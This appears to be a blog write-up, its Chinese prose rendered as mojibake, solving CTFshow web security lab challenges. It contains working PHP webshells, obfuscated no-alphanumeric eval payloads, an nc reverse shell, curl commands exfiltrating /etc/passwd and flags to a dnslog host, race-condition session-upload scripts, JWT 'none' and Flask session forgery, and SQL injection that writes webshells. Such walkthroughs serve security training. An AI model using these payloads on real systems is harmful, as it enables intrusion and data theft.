---
title: CTFshow webåº”ç”¨å®‰å…¨ä¸é˜²æŠ¤ wp
date: 2025-09-04 14:14:00
permalink: /pages/ctfshow-websec/
sidebar: true
article: true
categories:
  - wp
tags:
  - ctf
  - wp
author: 
  name: the0n3
  link: https://the0n3.top
---



## ç¬¬ä¸€ç« 

### Base64ç¼–ç éšè—

ç™»å½•å¯†ç åœ¨htmlæºç é‡Œå†™æ­»ï¼Œbase64è§£ç 

![](/medias/ctfshow-web/1.png)

![](/medias/ctfshow-web/2.png)



### HTTPå¤´æ³¨å…¥

ä½¿ç”¨æºç é‡Œçš„å¯†ç ç™»å½•ï¼Œæç¤ºéœ€è¦ä½¿ç”¨æŒ‡å®šçš„uaå¤´

![3](/medias/ctfshow-web/3.png)



![](/medias/ctfshow-web/4.png)



### Base64å¤šå±‚åµŒå¥—è§£ç 

å‰ç«¯éªŒè¯é€»è¾‘

```javascript
document.getElementById('loginForm').addEventListener('submit', function(e) {
            const correctPassword = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=";
            
            function validatePassword(input) {
                let encoded = btoa(input);
                encoded = btoa(encoded + 'xH7jK').slice(3);
                encoded = btoa(encoded.split('').reverse().join(''));
                encoded = btoa('aB3' + encoded + 'qW9').substr(2);
                return btoa(encoded) === correctPassword;
            }

            const enteredPassword = document.getElementById('password').value;
            const messageElement = document.getElementById('message');
            
            if (!validatePassword(enteredPassword)) {
                e.preventDefault();
                messageElement.textContent = "Login failed! Incorrect password.";
                messageElement.className = "message error";
            }
        });
```

åŠ å¯†é€»è¾‘ï¼š

`btoa(input)`â†’ Base64 ç¼–ç åŸå§‹å¯†ç ã€‚

`btoa(encoded + 'xH7jK').slice(3)`â†’ æ‹¼æ¥å›ºå®šå­—ç¬¦ä¸²ï¼Œå†ç¼–ç å¹¶æˆªå–ã€‚

`btoa(åè½¬å­—ç¬¦ä¸²)`â†’ åè½¬å¹¶ Base64 ç¼–ç ã€‚

`btoa('aB3' + encoded + 'qW9').substr(2)`â†’ æ‹¼æ¥å›ºå®šå¤´å°¾ï¼Œå†ç¼–ç å¹¶æˆªå–ã€‚

`btoa(encoded) === correctPassword`â†’å†base64ï¼Œ æœ€ç»ˆæ¯”å¯¹ã€‚

é€†å‘è§£å¯†ï¼š

- base64è§£ç 

- è§£ç åçš„å­—ç¬¦ä¸²å‰é¢çˆ†ç ´ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå†å°è¯•base64è§£ç ï¼Œè¦å¾—åˆ°`aB3`+encoded+`qW9`çš„æ ¼å¼

- å†æ¬¡base64è§£ç ï¼Œåè½¬

- å°è¯•å¼€å¤´çˆ†ç ´3ä¸ªå­—ç¬¦ä¸²ï¼Œbase64è§£ç å¾—åˆ°ä»¥`xH7jk`ç»“å°¾çš„ä¸€æ¬¡base64ç¼–ç å†…å®¹

- base64è§£ç ï¼Œå¾—åˆ°æœ€ç»ˆç”¨æˆ·åº”è¯¥è¾“å…¥çš„å¯†ç 

  

  ```python
  import base64
  import itertools
  import string
  import requests
  
  # åŠ å¯†å‡½æ•°
  def encrypt(password):
      s = base64.b64encode(password.encode()).decode()
      s = base64.b64encode((s + 'xH7jK').encode()).decode()[3:]
      s = base64.b64encode(s[::-1].encode()).decode()
      s = base64.b64encode(f'aB3{s}qW9'.encode()).decode()[2:]
      return base64.b64encode(s.encode()).decode()
  
  
  # çˆ†ç ´å‰ç¼€å‡½æ•°
  def brute_prefix(target_b64, start_marker='', end_marker='', prefix_len=2, charset=None):
      charset = charset or string.ascii_letters + string.digits
      for prefix in itertools.product(charset, repeat=prefix_len):
          candidate = ''.join(prefix) + target_b64
          try:
              decoded = base64.b64decode(candidate).decode('utf-8', errors='ignore')
              if decoded.startswith(start_marker) and decoded.endswith(end_marker):
                  return ''.join(prefix), decoded
          except Exception:
              continue
      return None, None
  
  
  # åˆå§‹ Base64 å­—ç¬¦ä¸²
  fuck_str = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU="
  re_step5 = base64.b64decode(fuck_str.encode())
  
  # Step 1: çˆ†ç ´å‰ç¼€æ‰¾åˆ° aB3 ... qW9
  prefix1, step3 = brute_prefix(re_step5.decode(), start_marker='aB3', end_marker='qW9', prefix_len=2)
  if not step3:
      print("âŒ æœªæ‰¾åˆ°åŒ¹é…å‰ç¼€1")
      exit()
  
  step3_inner = step3[3:-3]
  step2 = base64.b64decode(step3_inner).decode()[::-1]
  
  
  # Step 2: çˆ†ç ´å‰ç¼€æ‰¾åˆ°æœ€ç»ˆå¯†ç 
  chars_plus = string.ascii_letters + string.digits + '+'
  final_password = None
  for prefix2 in itertools.product(chars_plus, repeat=3):
      prefix_str2 = ''.join(prefix2)
      candidate = prefix_str2 + step2
      try:
          decoded = base64.b64decode(candidate).decode('utf-8', errors='ignore')
          if decoded.endswith('xH7jK'):
              temp_pass = base64.b64decode(decoded[:-5]).decode()
              if encrypt(temp_pass) == fuck_str:
                  final_password = temp_pass
                  print(f"âœ… æ‰¾åˆ°å¯†ç : {final_password}")
                  break
      except Exception:
          continue
  
  if not final_password:
      print("âŒ æœªæ‰¾åˆ°æœ€ç»ˆå¯†ç ")
      exit()
  
  
  # Step 3: ä½¿ç”¨ requests éªŒè¯å¯†ç 
  url = "http://2f7feaf3-cd7e-42a1-9663-9015fbf403c2.challenge.ctf.show/check.php"
  headers = {"User-Agent": "ctf-show-brower"}
  data = {"username": "admin", "password": final_password}
  
  resp = requests.post(url, headers=headers, data=data)
  if "Login failed! Incorrect password." not in resp.text:
      print(f"âœ… å¯†ç éªŒè¯æˆåŠŸï¼æ­£ç¡®å¯†ç : {final_password}")
      # print(resp.text)
  else:
      print("âŒ å¯†ç éªŒè¯å¤±è´¥")
  
  ```

  

  

![](/medias/ctfshow-web/5.png)

### HTTPSä¸­é—´äººæ”»å‡»

ä¸‹è½½é™„ä»¶è§£å‹ï¼Œä¸€ä¸ªssllog.txtï¼Œä¸€ä¸ªæµé‡åŒ…

wiresharkæ‰“å¼€æµé‡åŒ…çœ‹ä¸åˆ°å†…å®¹ï¼Œhttpsæµé‡åŠ å¯†äº†ï¼Œéœ€è¦ä½¿ç”¨ssllog.txtè¿™ä¸ªé™„ä»¶å¯†é’¥è§£å¯†

å…·ä½“æ“ä½œå‚è€ƒæ–‡ç« [[WiresharkæŠ“åŒ…å·¥å…·è§£æHTTPSåŒ… ](https://www.cnblogs.com/CodeReaper/p/16007397.html)](https://www.cnblogs.com/CodeReaper/p/16007397.html)

ç¼–è¾‘ã€‹é¦–é€‰é¡¹ã€‹protocolsã€‹tls

![](/medias/ctfshow-web/6.png)

å¯¼å…¥å¯†é’¥åå¯ä»¥çœ‹åˆ°httpæ˜æ–‡æµé‡äº†

![](/medias/ctfshow-web/7.png)



![](/medias/ctfshow-web/8.png)

### Cookieä¼ªé€ 

å¼±å¯†ç guest/guestæˆåŠŸç™»å½•

åœ¨cookieé‡Œæœ‰role=guestçš„å€¼ï¼Œä¿®æ”¹ä¸ºadminï¼Œæ‹¿åˆ°flag

![9](/medias/ctfshow-web/9.png)

## ç¬¬äºŒç« 

### ä¸€å¥è¯æœ¨é©¬å˜å½¢

æµ‹è¯•å‘ç°ä¸èƒ½å«æœ‰ç©ºæ ¼ï¼Œå¼•å·ï¼Œä¸€èˆ¬ğŸå­gäº†ï¼Œå¥½åƒåªèƒ½å‡½æ•°æ— å‚rce

POSTï¼šcode=eval(array_pop(next(get_defined_vars())));&1=phpinfo();

![](/medias/ctfshow-web/10.png)



### åå¼¹shellæ„é€ 

æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ



å…¬ç½‘æœåŠ¡å™¨ç›‘å¬

```bash
nc -lvnp 4444
```

é¶æœºåå¼¹shell

```bash
nc -e /bin/sh å…¬ç½‘æœåŠ¡å™¨ip 4444
```



![14](/medias/ctfshow-web/14.png)

æ²¡æœ‰å…¬ç½‘æœåŠ¡å™¨ï¼Œå¯ä»¥è¯•è¯•dnslogã€weblogï¼Œç›´æ¥å¤–å¸¦

å¹³å°æ¨è[ã€dnslog/weblogã€‘](https://eyes.sh/web/)ï¼Œå‚è€ƒå¾€æœŸæ–‡ç« [ã€ä½¿ç”¨weblogå¹³å°æ¥æ”¶æ— å›æŠ¥RCEå‘½ä»¤æ‰§è¡Œç»“æœã€‘](https://the0n3.top/pages/rce-weblog/)

```bash
code=curl 219tzymz.eyes.sh -X POST -d "1=`cat f*;cat /f*`"
```



![](/medias/ctfshow-web/11.png)

![](/medias/ctfshow-web/12.png)

æˆ–è€…å†™webshell

```bash
code=echo "<?php highlight_file(__FILE__);eval($_GET[1]);?>" > 1.php
```

![13](/medias/ctfshow-web/13.png)

### ç®¡é“ç¬¦ç»•è¿‡è¿‡æ»¤

è¿™é‡Œé¢˜ç›®ç¯å¢ƒç±»ä¼¼ä¸‹é¢ï¼Œè€ƒå¯Ÿlinux shellç¯å¢ƒæ€ä¹ˆä¸€å¥è¯æ‰§è¡Œå¤šä¸ªå‘½ä»¤

```php
<?php
    $cmd = $_GET['code'];
    system("ls $cmd");
```

å¯ä»¥ä½¿ç”¨`;`ã€`||`ã€`&&`ç­‰ç®¡é“ç¬¦æ¥åˆ†å‰²å¤šæ¡å‘½ä»¤ï¼Œè¿™æ ·ä¸€å¥è¯å°±å¯ä»¥æ‰§è¡Œå¤šæ¡å‘½ä»¤

`;` ï¼ˆé¡ºåºæ‰§è¡Œï¼Œä¸ç®¡å¯¹é”™ï¼‰

`||` ï¼ˆé€»è¾‘æˆ–ï¼Œå‰ä¸€ä¸ªå¤±è´¥æ‰æ‰§è¡Œåä¸€ä¸ªï¼‰

`&&` ï¼ˆé€»è¾‘ä¸ï¼Œå‰ä¸€ä¸ªæˆåŠŸæ‰æ‰§è¡Œåä¸€ä¸ªï¼‰

å¥½ï¼ŒçŸ¥é“äº†ä¸Šé¢3ç‚¹ï¼Œçœ‹çœ‹ä¸‹é¢å‘½ä»¤å¦‚ä½•æ‰§è¡Œ

```bash
ls;whoami
ls||whoami
ls&&whoami
```

1,3æˆåŠŸæ‰§è¡Œä¸¤æ¡å‘½ä»¤ï¼Œ2å‘½ä»¤åªæ‰§è¡Œäº†ls

::: tip
ä¸ºä»€ä¹ˆpayloadä½¿ç”¨`&&whoami`ä¹Ÿåªæ‰§è¡Œäº†`ls`å‘½ä»¤?ï¼Œ`&`åœ¨ä¼ å‚è¿‡ç¨‹æœ‰ç‰¹æ®Šè¯­ä¹‰ï¼Œéœ€è¦urlç¼–ç ä¸€ä¸‹
:::

é‚£ä¹ˆæŸ¥çœ‹flag

```bash
ls;tac f*
```

![](/medias/ctfshow-web/15.png)


### æ— å­—æ¯æ•°å­—ä»£ç æ‰§è¡Œ

éšä¾¿è¾“å…¥ç‚¹ä»€ä¹ˆï¼Œåç«¯æŠ¥é”™ï¼Œä½¿ç”¨çš„`eval`æ¥æ‰§è¡Œå­—ç¬¦

![16](/medias/ctfshow-web/16.png)

ç”¨aiç®€å•å†™äº†ä¸€ä¸ªçº¯å‰ç«¯payloadç”Ÿæˆé¡µé¢[æ— å­—æ¯æ•°å­—ä»£ç æ‰§è¡Œpayloadç”Ÿæˆ](https://the0n3.top/rce/)ï¼Œå®ç°ç»†èŠ‚å‚è€ƒ[PHPæ— å­—æ¯æ•°å­—RCE æˆ–ã€å¼‚æˆ–ã€å–åå®ç°](https://the0n3.top/pages/92040c/)

å‡ ç§æ–¹å¼å®ç°çš„payload

```bash
# payloadï¼šassert("eval($_POST[1]);");
# å–å
(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);
# å¼‚æˆ–
(('%bf'^'%de').('%bf'^'%cc').('%bf'^'%cc').('%bf'^'%da').('%bf'^'%cd').('%bf'^'%cb'))(('%bf'^'%da').('%bf'^'%c9').('%bf'^'%de').('%bf'^'%d3').('%df'^'%f7').('%df'^'%fb').('%bf'^'%e0').('%bf'^'%ef').('%bf'^'%f0').('%bf'^'%ec').('%bf'^'%eb').('%bf'^'%e4').('%df'^'%ee').('%bf'^'%e2').('%df'^'%f6').('%df'^'%e4'));
# æˆ–
(('%61'|'%61').('%73'|'%73').('%73'|'%73').('%65'|'%65').('%72'|'%72').('%74'|'%74'))(('%65'|'%65').('%76'|'%76').('%61'|'%61').('%6c'|'%6c').('%28'|'%28').('%24'|'%24').('%5f'|'%5f').('%50'|'%50').('%4f'|'%4f').('%53'|'%53').('%54'|'%54').('%5b'|'%5b').('%31'|'%31').('%5d'|'%5d').('%29'|'%29'));
```



ç”Ÿæˆçš„payloadè¦ä½¿ç”¨`burp`å‘é€

![](/medias/ctfshow-web/17.png)



### æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ



è¿™é“é¢˜æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œæ— å­—æ¯ã€æ•°å­—ï¼Œæ— å›æ˜¾ï¼Œå°è¯•å¤–å¸¦æˆ–è€…åå¼¹shellï¼Œåœ¨ä¸Šä¼ å†™å…¥webshellæ—¶ï¼Œæ–‡ä»¶æ˜¯ç©ºçš„æ¯”è¾ƒå¥‡æ€ª

ä½¿ç”¨äº†linuxä¸‹ `. file`æ‰§è¡Œæ–‡ä»¶å†…å®¹çš„ç‰¹æ€§

ç”±äºä¸ç¡®å®šseesionæ–‡ä»¶è·¯å¾„

```python
import requests
import threading
import time
import signal
import sys

# é¶æœºé“¾æ¥
url = 'http://a9dbdc84-611d-455a-9f9e-c7b8dc599cdf.challenge.ctf.show/'
shell_url = url + "44.txt"
sessionid = 'cnmusa'

data = {
    'PHP_SESSION_UPLOAD_PROGRESS': 'ls > 44.txt;curl -X POST http://219tzymz.eyes.sh -d "1=`cat /etc/passwd;cat /var/www/html/*;cat /f*`"',
}

file = {
    'file': sessionid
}

cookies = {
    'PHPSESSID': sessionid
}

# å¸¸è§ session æ–‡ä»¶è·¯å¾„åˆ—è¡¨
# session_paths = [
#     f"/var/lib/php/sess_{sessionid}",
#     f"/var/lib/php/sessions/sess_{sessionid}",
#     f"/tmp/sess_{sessionid}",
#     f"/tmp/sessions/sess_{sessionid}"
# ]
str_len = len(sessionid)
payload = "?"*str_len
session_paths = [
    f". /???/???/???/????_{payload}",
    f". /???/???/???/????????/????_{payload}",
    f". /???/????_{payload}",
    f". /???/????????/????_{payload}"
]

# å…¨å±€åœæ­¢äº‹ä»¶
stop_event = threading.Event()

def upload_file():
    while not stop_event.is_set():
        try:
            requests.post(url, data=data, files=file, cookies=cookies, timeout=3)
        except requests.RequestException:
            pass
        # time.sleep(1)

def check_file():
    while not stop_event.is_set():
        try:
            # å°è¯•æ‰€æœ‰å¸¸è§ session æ–‡ä»¶è·¯å¾„
            for path in session_paths:
                print(f"Trying path: {path}")
                requests.post(url, data={"code": path}, timeout=3)

            r = requests.get(shell_url, timeout=3)
            if r.status_code == 200:
                print('Webshell created successfully')
                print(r.text)
                stop_event.set()  # æ–‡ä»¶åˆ›å»ºæˆåŠŸï¼Œé€šçŸ¥æ‰€æœ‰çº¿ç¨‹é€€å‡º
                break
            else:
                print(f"{r.status_code}")
        except requests.RequestException:
            pass
        # time.sleep(1)

# Ctrl+C æ•è·å¤„ç†
def signal_handler(sig, frame):
    print("\nCtrl+C æ•è·ï¼Œæ­£åœ¨é€€å‡º...")
    stop_event.set()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# å¯åŠ¨çº¿ç¨‹
threads = []
for _ in range(5):
    t = threading.Thread(target=upload_file, daemon=True)
    t.start()
    threads.append(t)

for _ in range(15):
    t = threading.Thread(target=check_file, daemon=True)
    t.start()
    threads.append(t)

# ä¸»çº¿ç¨‹ç­‰å¾…äº‹ä»¶
try:
    while not stop_event.is_set():
        time.sleep(0.5)
except KeyboardInterrupt:
    stop_event.set()

for t in threads:
    t.join()
```





![](/medias/ctfshow-web/33.png)

## ç¬¬ä¸‰ç« 

### æ—¥å¿—æ–‡ä»¶åŒ…å«

nginxè®¿é—®æ—¥å¿—è·¯å¾„ï¼š`/var/log/nginx/access.log`

åŒ…å«nginxæ—¥å¿—ï¼Œæ§åˆ¶uaå¤´å†…å®¹ï¼Œæ”¾å…¥phpä»£ç ã€‚æ‰§è¡Œå‘½ä»¤ï¼Œæ—¥å¿—æ–‡ä»¶å†…å®¹å¤ªå¤šäº†ï¼ŒæŠŠflagå†™åˆ°æ–°æ–‡ä»¶é‡ŒæŸ¥çœ‹

![18](/medias/ctfshow-web/18.png)

### php://filterè¯»å–æºç 

ä¼ªåè®®è¯»å–index.phpæºç 

```php
file=php://filter/convert.base64-encode/resource=index.php
```

![](/medias/ctfshow-web/19.png)

base64è§£ç ï¼Œå‘ç°å¯ç–‘æ–‡ä»¶`db.php`ï¼Œå†ç”¨ä¼ªåè®®è¯»å–`db.php`

![20](/medias/ctfshow-web/20.png)

base64è§£ç `db.php`å†…å®¹ï¼Œæ‹¿åˆ°flag

![21](/medias/ctfshow-web/21.png)



### è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰

åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„webshellæ–‡æœ¬å†…å®¹

åœ¨åšå®¢ä¸Šæ”¾äº†ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œæ–¹ä¾¿ç›´æ¥æ–‡ä»¶åŒ…å«

```php
<?php highlight_file(__FILE__);eval($_GET[1]);?>
```



![22](/medias/ctfshow-web/22.png)

![](/medias/ctfshow-web/23.png)



### è·¯å¾„éå†çªç ´

`path=index.php`è¯»å–index.phpæºç 

- ç¦æ­¢æ—¥å¿—ã€å„ç§åè®®`:/`
- ç¦æ­¢`/`,`../`å¼€å¤´
- flagåœ¨/flag.txt

```php
<?php

if (isset($_GET['path']) && $_GET['path'] !== '') {
$path = $_GET['path'];
if(preg_match('/data|log|access|pear|tmp|zlib|filter|:/', $path) ){
echo '<span style="color:#f00;">ç¦æ­¢è®¿é—®æ•æ„Ÿç›®å½•æˆ–æ–‡ä»¶</span>';
exit;
}

#ç¦æ­¢ä»¥/æˆ–è€…../å¼€å¤´çš„æ–‡ä»¶å
if(preg_match('/^(\.|\/)/', $path)){
echo '<span style="color:#f00;">ç¦æ­¢ä»¥/æˆ–è€…../å¼€å¤´çš„æ–‡ä»¶å</span>';
exit;
}

echo $path."å†…å®¹ä¸ºï¼š\n";
echo str_replace("\n", "<br>", htmlspecialchars(file_get_contents($path)));
} else {
echo '<span style="color:#888;">ç›®æ ‡flagæ–‡ä»¶ä¸º/flag.txt</span>';
}
?>
```

è¿™é‡Œè¦ç”¨çš„è·¯å¾„ç©¿è¶Šï¼Œå¦‚æœä½¿ç”¨æƒ³è¦å›åˆ°`/`ç›®å½•ï¼Œå¯ä»¥ä½¿ç”¨`../../../`ä¸€æ­¥æ­¥å¾€ä¸Šèµ°ï¼Œä½†æ˜¯è¿™é‡Œç¦æ­¢`/`æˆ–è€…`../`å¼€å¤´ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•åœ¨å‰é¢æ·»åŠ ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ï¼Œåœ¨å¯»æ‰¾æ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨å¿½ç•¥ä¸å­˜åœ¨çš„ç›®å½•ï¼Œç»§ç»­åé¢çš„ç›®å½•ç©¿è¶Šæ“ä½œï¼Œæœ€åå›åˆ°æ ¹ç›®å½•

```bash
aaa/../../../../../../../../flag.txt
```

![24](/medias/ctfshow-web/24.png)



### ä¸´æ—¶æ–‡ä»¶åŒ…å«



è„šæœ¬æ¢­å“ˆ

```python
import io
import requests
import threading
# å¦‚æœé¢˜ç›®é“¾æ¥æ˜¯httpsï¼Œæ¢æˆhttp
# url = 'https://85a94ccd-c8d7-40ac-ae8f-38ce8f7febb6.challenge.ctf.show/'
url = 'http://0253528e-43f1-427b-b1f1-81fc84692b2d.challenge.ctf.show/'
sessionid = 'ctfshow'

def write(session): # å†™å…¥ä¸´æ—¶æ–‡ä»¶
    while True:
        fileBytes = io.BytesIO(b'a'*1024*50) # 50kb
        session.post(url,
        cookies = {'PHPSESSID':sessionid},
        data = {'PHP_SESSION_UPLOAD_PROGRESS':'<?php file_put_contents("shell.php","<?php highlight_file(__FILE__);eval(\$_GET[1]);?>");?>'},
        files={'file':('1.jpg',fileBytes)}
        )

def read(session):
    while True:
        session.get(url + '?path=/tmp/sess_' + sessionid) # è¿›è¡Œæ–‡ä»¶åŒ…å«
        r = session.get(url+'shell.php') # æ£€æŸ¥æ˜¯å¦å†™å…¥ä¸€å¥è¯æœ¨é©¬
        if r.status_code == 200:
            print('OK')
            return ''

evnet=threading.Event() # å¤šçº¿ç¨‹

session = requests.session()
for i in range(5):
    threading.Thread(target = write,args = (session,)).start()
for i in range(5):
    threading.Thread(target = read,args = (session,)).start()

evnet.set()
```



![34](/medias/ctfshow-web/34.png)

## ç¬¬å››ç« 

### Sessionå›ºå®šæ”»å‡»

æ²¡çœ‹æ‡‚ï¼Œç™»å½•å‘é€ä¿¡æ¯å°±æœ‰flagäº†

![25](/medias/ctfshow-web/25.png)

### JWTä»¤ç‰Œä¼ªé€ 

æ‹¿è‡ªå·±çš„jwtä»¤ç‰Œè§£æä¸€ä¸‹

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "user": "admin",
  "admin": false
}
```

ä½¿ç”¨è„šæœ¬æŠŠåŠ å¯†ç®—æ³•ä¼ªé€ ä¸ºnone

ä¼ªé€ è„šæœ¬

```python
import base64
import json

def b64url_encode(data: bytes) -> str:
    """Base64 URL-safe ç¼–ç ï¼Œå»æ‰å¡«å…… ="""
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

# Header: alg=none
header = {"alg": "none", "typ": "JWT"}
payload = {"user": 'admin', "admin": "false"}  # ä½ è¦ä¼ªé€ çš„ç”¨æˆ·æ•°æ®

# åˆ†åˆ«ç¼–ç 
header_b64 = b64url_encode(json.dumps(header).encode())
payload_b64 = b64url_encode(json.dumps(payload).encode())

# æ‹¼æ¥ JWTï¼Œç­¾åä¸ºç©º
jwt = f"{header_b64}.{payload_b64}."

print("ä¼ªé€ çš„ JWT:")
print(jwt)
```

### Flask_Sessionä¼ªé€ 



ç‚¹å‡»çˆ¬å–ç™¾åº¦ï¼Œç›´æ¥åŠ è½½äº†ä¸€ä¸ªç™¾åº¦é¦–é¡µï¼Œçœ‹åˆ°urlæ¯”è¾ƒå¯ç–‘

![](/medias/ctfshow-web/26.png)

å°è¯•ç›´æ¥è¯»å–`/etc/passwd`ï¼Œæ— æœ

ç›®å½•ç©¿è¶Š`../../../../../../../../../../../../etc/passwd`ï¼Œæ— æœ

å°è¯•`file:///etc/passwd`åè®®ï¼ŒæˆåŠŸ

![27](/medias/ctfshow-web/27.png)

`flask`å·¥ä½œç›®å½•æ¯”è¾ƒå¸¸è§çš„æ˜¯`/app/app.py`ï¼Œå°è¯•è¯»å–æºç 

![28](/medias/ctfshow-web/28.png)

æºç 

```python
# encoding:utf-8
import re
import random
import uuid
import urllib.request
from flask import Flask, session, request

app = Flask(__name__)

# éšæœºç”Ÿæˆä¸€ä¸ª SECRET_KEY
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random() * 100)
print(app.config['SECRET_KEY'])

app.debug = False


@app.route('/')
def index():
    session['username'] = 'guest'
    return 'CTFshow ç½‘é¡µçˆ¬è™«ç³»ç»Ÿ è¯»å–ç½‘é¡µ'


@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        if re.findall('flag', url, re.IGNORECASE):
            return 'ç¦æ­¢è®¿é—®'
        res = urllib.request.urlopen(url)
        return res.read().decode('utf-8', errors='ignore')
    except Exception as ex:
        print(str(ex))
        return 'æ— è¯»å–å†…å®¹å¯ä»¥å±•ç¤º'


@app.route('/flag')
def flag():
    if session.get('username') == 'admin':
        return open('/flag.txt', encoding='utf-8').read()
    else:
        return 'è®¿é—®å—é™'


if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0")
```

é˜…è¯»æºç å¯ä»¥çŸ¥é“ï¼Œä¸å…è®¸urlé‡Œå‡ºç°flagï¼Œå‡ºç°ä¼šé‰´æƒï¼Œæ‰€ä»¥éœ€è¦ä¼ªé€ `admin` session



::: tip
Python `random.random()` æ˜¯ç¡®å®šæ€§çš„ï¼Œç§å­ç›¸åŒï¼Œè¾“å‡ºå®Œå…¨ç›¸åŒï¼Œåªè¦è¯»å–åˆ°æœºå™¨MACåœ°å€ï¼Œå°±å¯ä»¥ç²¾å‡†è®¡ç®—å‡ºå¯†é’¥
:::

è¯»å–æœºå™¨ç 

```bash
read?url=file:///sys/class/net/eth0/address
```

æ‹¿åˆ°æœºå™¨ç `02:42:ac:0c:fc:3d`

è®¡ç®—å¯†é’¥`SECRET_KEY`

```python
import random

mac = int("02:42:ac:0c:fc:3d".replace(":",""),16) # å·²çŸ¥çš„ MAC åœ°å€
random.seed(mac)
key = str(random.random()*100)
print(key) # 79.43065193591464
```

ä½¿ç”¨[ã€flask-session-cookie-managerã€‘](https://github.com/noraj/flask-session-cookie-manager)æ¥ä¼ªé€ seesion

```bash
python3 .\flask_session_cookie_manager3.py decode -s "79.43065193591464"  -c "eyJ1c2VybmFtZSI6Imd1ZXN0In0.aLg2YA.Bq9NjyH26PAyzl3YjpBKIIgHOVQ"

python3 .\flask_session_cookie_manager3.py encode -s "79.43065193591464" -t "{'username':'admin'}"
```

æ›´æ¢sessionè®¿é—®`/flag`æ‹¿åˆ°flag

![](/medias/ctfshow-web/30.png)

### å¼±å£ä»¤çˆ†ç ´

ä¸‹è½½é¢˜ç›®æä¾›çš„å­—å…¸ï¼Œå¯¼å…¥burp intrudeæ¨¡å—çˆ†ç ´å¯†ç ï¼Œå°è¯•adminç”¨æˆ·



![31](/medias/ctfshow-web/31.png)

![32](/medias/ctfshow-web/32.png)

admin/834100



## ç¬¬äº”ç« 

### è”åˆæŸ¥è¯¢æ³¨å…¥

sqlmapç§’äº†

```cmd
python3 sqlmap.py -u "https://5339d65e-55dc-434a-86b7-073e1c9f2d2d.challenge.ctf.show/?id=4" -p id --dbs --batch

available databases [5]:
[*] ctfshow_page_informations
[*] information_schema
[*] mysql
[*] performance_schema
[*] test

python3 sqlmap.py -u "https://5339d65e-55dc-434a-86b7-073e1c9f2d2d.challenge.ctf.show/?id=4" -p id --dbs --batch -D --tables

Database: ctfshow_page_informations
[2 tables]
+-------+
| pages |
| users |
+-------+
python3 sqlmap.py -u "https://5339d65e-55dc-434a-86b7-073e1c9f2d2d.challenge.ctf.show/?id=4" -p id --dbs --batch -D ctfshow_page_informations --tables -T users --dump

Database: ctfshow_page_informations
Table: users
[1 entry]
+----+----------------------------+----------+
| id | password                   | username |
+----+----------------------------+----------+
| 1  | CTF{admin_secret_password} | admin    |
+----+----------------------------+----------+
```

![](/medias/ctfshow-web/35.png)

### å¸ƒå°”ç›²æ³¨çˆ†ç ´

username,passwordéƒ½å­˜åœ¨sqlæ³¨å…¥

![](/medias/ctfshow-web/36.png)

å°è¯•è”åˆæŸ¥è¯¢å†™å…¥webshell

![](/medias/ctfshow-web/37.png)

è™½ç„¶é¡µé¢æŠ¥é”™äº†ï¼Œä½†æ˜¯æˆåŠŸå†™å…¥åˆ°æ–‡ä»¶é‡Œäº†

![](/medias/ctfshow-web/38.png)

å†™å…¥webshell
```php
password=1' union select 1,2,'<?php eval($_POST[1]);?>' into outfile'/var/www/html/1.txt'%23&username=1
```

èšå‰‘è¿æ¥ï¼Œæ‰¾åˆ°æ•°æ®åº“é…ç½®å†…å®¹

![39](/medias/ctfshow-web/39.png)

èšå‰‘è¿æ¥æ•°æ®åº“ï¼ŒæŸ¥çœ‹flag

![40](/medias/ctfshow-web/40.png)


### å †å æ³¨å…¥å†™shell

burpæŠ“åŒ…å¯¹å‚æ•°è¿›è¡Œfuzz

![42](/medias/ctfshow-web/42.png)

åœ¨ username å€¼ä¸º`\`æ—¶ï¼Œé¡µé¢å“åº”é•¿åº¦å‡ºç°ä¸åŒã€‚è¯´æ˜å¯èƒ½è½¬ä¹‰äº† ç™»å½•æŸ¥è¯¢è¯­å¥åŒ…è£¹ username çš„å¼•å·ï¼Œå¯¼è‡´è¯­æ³•é”™è¯¯

å¯ä»¥çŒœæµ‹å¸¸è§ç™»å½•è¯­å¥

```php
<?php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

è½¬ä¹‰åï¼Œ`$username`çš„å•å¼•å·ä¼šåŒ¹é…åˆ° `$password`çš„å•å¼•å·ï¼Œæœ€åå¤šå‡ºä¸€ä¸ªå•å¼•å·ï¼Œ`$password`æ•´ä¸ªå€¼å¯æ§ï¼Œpasswordå‰å·²ç»æœ‰äº†å•å¼•å·ï¼Œå†ä½¿ç”¨å•å¼•å·é—­åˆä¼šè¯­æ³•é”™è¯¯ï¼Œæ‰€ä»¥ passwordä½ç½®ä¸éœ€è¦é—­åˆäº†ï¼ŒæŠŠåé¢å•å¼•å·æ³¨é‡Šæ‰å°±å¯ä»¥äº†

```plaintext
username=\&password=or 1=1#
```

å‡ºç°`welcome`ï¼Œç™»å½•æˆåŠŸçš„é€»è¾‘ï¼Œè¯´æ˜å­˜åœ¨sqlæ³¨å…¥

æœ‰ä¸åŒå›æ˜¾ï¼Œå¯ä»¥ç”¨æ¥å¸ƒå°”ç›²æ³¨

![43](/medias/ctfshow-web/43.png)


å¯ä»¥æˆåŠŸæ‰§è¡Œsleepå‡½æ•°ï¼Œå­˜åœ¨å †å æ³¨å…¥ã€æ—¶é—´ç›²æ³¨

```plaintext
username=\&password=or 1=1;select sleep(5)#
```

